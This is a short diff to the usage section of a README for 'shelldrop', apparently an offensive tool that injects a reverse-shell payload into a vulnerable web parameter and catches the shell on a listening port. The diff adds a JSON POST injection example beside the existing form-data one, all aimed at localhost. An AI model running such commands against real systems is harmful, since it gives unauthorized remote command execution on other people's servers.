@@ -63,7 +63,11 @@ shelldrop -l 127.0.0.1 -p 7331 -u "http://localhost/shell.php?cmd=SHELLDROP" -P 
 
 #### Post Data Injection
 ```bash
+# Form data
 shelldrop -l 127.0.0.1 -p 7331 -u "http://localhost/shell.php" -X POST -d "vuln_param=SHELLDROP"
+
+# JSON data
+shelldrop -l 127.0.0.1 -p 7331 -u "http://localhost/shell.php" -X POST -d '{"vuln_param": "SHELLDROP"}' -H "Content-Type: application/json"
 ```
 
 #### Header Injection
